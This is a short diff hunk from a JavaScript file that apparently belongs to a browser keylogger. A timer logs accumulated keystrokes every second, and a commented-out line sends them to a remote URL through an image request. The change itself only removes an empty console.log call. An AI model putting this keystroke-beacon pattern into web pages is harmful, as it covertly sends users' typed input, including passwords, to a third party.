@@ -12,7 +12,6 @@ window.setInterval(function(){
 		//new Image().src = url+keys;
 		console.log(keys);
 		keys = '';
-		console.log();
 	}
 }, 1000);
 
